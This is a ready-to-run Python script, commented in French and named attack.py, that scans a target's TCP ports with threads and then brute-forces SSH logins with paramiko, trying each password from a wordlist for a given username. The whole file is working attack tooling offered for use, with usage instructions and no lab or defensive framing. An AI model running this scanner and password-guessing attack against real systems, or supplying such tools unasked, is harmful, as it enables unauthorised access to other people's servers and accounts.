#!/usr/bin/env python3
"""
pour l'executer, il faut installer le module paramiko pour la connexion SSH, avec cette commande : pip install paramiko 
puis, entrer ceci depuis le terminal : python attack.py --target ip_adresse --start_port 1 --end_port 1024 --user testuser --dict dictionary.txt

"""
import argparse
import socket
import sys
import threading
import time
import paramiko

# -------------------------------------------------------------------
# Fonctions de scan de ports
# -------------------------------------------------------------------
def scan_port(host: str, port: int, timeout: float = 1.0):
    """
    Tente de se connecter au port spécifié sur la cible.
    
    Args:
        host (str): Adresse IP ou nom d'hôte.
        port (int): Numéro de port à tester.
        timeout (float): Délai d'attente pour la connexion.
    
    Returns:
        tuple: (port, service) si le port est ouvert, sinon None.
    """
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(timeout)
            result = sock.connect_ex((host, port))
            if result == 0:
                try:
                    service = socket.getservbyport(port, 'tcp')
                except OSError:
                    service = "unknown"
                return (port, service)
    except Exception:
        pass
    return None

def port_worker(host: str, port_range: range, results: list):
    """
    Fonction lancée par un thread pour scanner une plage de ports.
    """
    for port in port_range:
        res = scan_port(host, port)
        if res:
            results.append(res)

def scan_ports(host: str, start_port: int, end_port: int, num_threads: int = 10):
    """
    Scanne tous les ports entre start_port et end_port sur la cible en utilisant plusieurs threads.
    
    Returns:
        list: Liste des ports ouverts sous la forme (port, service)
    """
    all_ports = list(range(start_port, end_port + 1))
    results = []
    threads = []
    chunk_size = len(all_ports) // num_threads + 1
    for i in range(num_threads):
        chunk = all_ports[i*chunk_size: (i+1)*chunk_size]
        if chunk:
            t = threading.Thread(target=port_worker, args=(host, range(min(chunk), max(chunk)+1), results))
            threads.append(t)
            t.start()
    for t in threads:
        t.join()
    results.sort(key=lambda x: x[0])
    return results

# -------------------------------------------------------------------
# Fonction d'attaque SSH (similaire à Hydra)
# -------------------------------------------------------------------
def try_ssh_login(host: str, port: int, username: str, password: str, timeout: int = 5) -> bool:
    """
    Tente de se connecter en SSH sur la cible avec un mot de passe donné.
    
    Args:
        host (str): Adresse cible.
        port (int): Port SSH.
        username (str): Nom d'utilisateur.
        password (str): Mot de passe à tester.
        timeout (int): Délai d'attente.
    
    Returns:
        bool: True si la connexion réussit, sinon False.
    """
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=host, port=port, username=username, password=password, timeout=timeout)
        client.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except paramiko.SSHException as e:
        print(f"[!] SSHException pour '{password}': {e}. Attente de 5 secondes...")
        time.sleep(5)
        return False
    except Exception as e:
        print(f"[!] Erreur pour le mot de passe '{password}': {e}")
        return False

def dictionary_attack(host: str, port: int, username: str, dictionary_file: str):
    """
    Lit la wordlist fournie et tente de se connecter en SSH avec chaque mot de passe.
    
    Args:
        host (str): Cible.
        port (int): Port SSH.
        username (str): Nom d'utilisateur.
        dictionary_file (str): Chemin vers le fichier dictionnaire.
    
    Retourne:
        Le mot de passe trouvé ou None.
    """
    try:
        with open(dictionary_file, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"Erreur lors de la lecture du dictionnaire: {e}")
        return None

    print(f"\nDémarrage de l'attaque par dictionnaire sur {host}:{port} pour l'utilisateur '{username}'.")
    print(f"Nombre de mots de passe candidats : {len(passwords)}")
    for pwd in passwords:
        print(f"Test du mot de passe : {pwd}")
        if try_ssh_login(host, port, username, pwd):
            print(f"\n[+] Succès ! Le mot de passe est : {pwd}")
            return pwd
    print("\n[-] Aucune correspondance trouvée dans la wordlist.")
    return None

# -------------------------------------------------------------------
# Partie principale du script
# -------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(
        description="Scan les ports d'une cible et lance une attaque par dictionnaire SSH (similaire à Hydra)."
    )
    parser.add_argument("--target", required=True, help="Adresse IP ou nom d'hôte cible.")
    parser.add_argument("--start_port", type=int, required=True, help="Port de début du scan.")
    parser.add_argument("--end_port", type=int, required=True, help="Port de fin du scan.")
    parser.add_argument("--user", required=True, help="Nom d'utilisateur SSH pour l'attaque.")
    parser.add_argument("--dict", required=True, help="Chemin vers le fichier dictionnaire (wordlist).")
    args = parser.parse_args()

    target = args.target
    start_port = args.start_port
    end_port = args.end_port
    username = args.user
    dict_file = args.dict

    print(f"Scan de la cible {target} sur les ports de {start_port} à {end_port}...")
    open_ports = scan_ports(target, start_port, end_port)
    if open_ports:
        print("\nPorts ouverts détectés :")
        for port, service in open_ports:
            print(f"  - Port {port}: Service {service}")
    else:
        print("Aucun port ouvert trouvé dans cette plage.")
        sys.exit(1)

    # Filtrer les ports avec le service SSH (souvent 'ssh', mais dans certains cas, getservbyport peut renvoyer 'unknown')
    ssh_ports = [port for port, service in open_ports if service.lower() == "ssh" or port == 22]
    if not ssh_ports:
        print("Aucun port SSH détecté sur la cible. L'attaque par dictionnaire SSH n'est pas possible.")
        sys.exit(1)
    else:
        print("\nPort(s) SSH détecté(s) :", ssh_ports)
        # Pour simplifier, on prend le premier port SSH trouvé
        ssh_port = ssh_ports[0]
        found_pwd = dictionary_attack(target, ssh_port, username, dict_file)
        if found_pwd:
            print(f"Attaque réussie sur {target}:{ssh_port}. Mot de passe trouvé : {found_pwd}")
        else:
            print("Attaque échouée. Aucun mot de passe correspondant n'a été trouvé.")

if __name__ == "__main__":
    main()
